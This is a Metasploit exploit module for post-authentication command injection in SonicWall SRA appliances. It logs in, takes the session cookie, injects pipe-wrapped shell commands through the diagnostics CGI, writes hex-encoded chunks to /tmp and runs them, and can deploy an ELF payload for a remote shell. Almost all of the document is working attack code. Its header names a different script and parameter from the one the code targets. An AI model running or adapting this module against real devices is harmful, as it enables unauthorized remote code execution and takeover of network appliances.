# Exploit Title: Sonicwall extensionsettings scriptname Remote Command Injection Vulnerablity
# Date: 12/25/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#
# CVE : (awaiting cve)

# vuln: extensionsettings.cgi / scriptfile (filename) parameter /

# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug.
#
# xort @ Critical Start

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sonicwall SRA <= v8.1.0.2-14sv remote exploit',
					'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
				a section of the machine's adminstrative infertface for performing configurations
				related to on-connect scripts to be launched for users's connecting.
			},
			'Author'         =>
				[
					'xort@Critical Start', # vuln + metasploit module
				],
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                {
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Linux Universal',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux'
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
					OptString.new('CMD', [ false, 'Command to execute', "" ]),
					Opt::RPORT(443),
				], self.class)
	end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;
                style_key = Rex::Text.rand_text_hex(32)

                # send request
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/cgi-bin/userLogin",
		      'headers' => {
			   'Connection' => 'close',
			   'Content-Type' => 'application/x-www-form-urlencoded',
			   'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
	              },
                      'vars_post' => {
			   'username' => username,
			   'password' => password_clear,
			   'domain' => 'LocalDomain',
			   'loginButton' => 'Login',
			   'state' => 'login',
			   'login' => 'true',
			   'VerifyCert' => '0',
			   'portalname' => 'VirtualOffice',
			   'ajax' => 'true'
		       },
                }, timeout)

		swap = res.headers['Set-Cookie'].split('\n').grep(/(.*)swap=([^;]+);/){$2}[0]

                return swap
        end

	def run_command_spliced(username, swap_cookie, cmd)

		vprint_status( "Running Command...\n" )

		# send request with payload
		res = send_request_cgi({
			'method' => 'GET',
#                        'uri'     => "/cgi-bin/diagnostics?currentTSREmailTo=|#{cmd}|x&tsrEmailCurrent=true",
                        'uri'     => "/cgi-bin/diagnostics",
			'vars_get' => {
				'tsrEmailCurrent' => 'true',
				'currentTSREmailTo' => '|'+cmd+'|x',
				},
		         'headers' => {
			   'Cookie' => 'swap='+swap_cookie+';',
			   'Content-Type' => 'text/plain; charset="iso-8859-1"',
			   'Connection' => 'close',
			 },
		}, 30 )

	end

	def run_command(username, swap_cookie, cmd)

	      write_mode = ">"
	      dump_file = "/tmp/qq"

	      # base64 - encode with base64 so we can send special chars and multiple lines
              #cmd_encoded = Base64.strict_encode64(cmd)

	      cmd_encoded = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

	      vprint_status("cmd_encoded = #{cmd_encoded}")

              for cmd_chunk in cmd_encoded.split(/(....................................................................................................)/)

                        cmd_new = "printf%20\"#{cmd_chunk}\"#{write_mode}#{dump_file}"
                        #cmd_new = "printf \"#{cmd_chunk}\"#{write_mode}#{dump_file}".gsub("+", "_")

                        # set to normal append for loops after the first round
                        if write_mode == ">"
                                write_mode = ">>"
                        end

                        # add cmd to array to be exected later
			run_command_spliced(username, swap_cookie, cmd_new)

                end

		# execute payload stored at dump_file

		run_command_spliced(username, swap_cookie, "chmod%20777%20/tmp/qq;sh%20/tmp/qq")

	end

	def exploit
		# timeout
		timeout = 1550;

		# params
		password_clear = datastore['PASSWORD']
		user = datastore['USERNAME']

		# do authentication
		swap_cookie = do_login(user, password_clear)

		vprint_status("authenticated 'swap' cookie: #{swap_cookie}\n")

		 #if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')
			vprint_status("encoded_cmd = #{encoded_cmd}")

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(user, swap_cookie, ("sudo /bin/rm -f /tmp/n;printf \"#{encoded_cmd}\">/tmp/n;chmod +rx /tmp/n;/tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')
			vprint_status("encoded_elf = #{encoded_elf}")

			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command(user, swap_cookie, ("echo -e \"#{encoded_elf}\"\>/tmp/m\;chmod +rx /tmp/m\;/tmp/m"))


			# wait for magic
                        handler

                end


	end
# sophox-release
end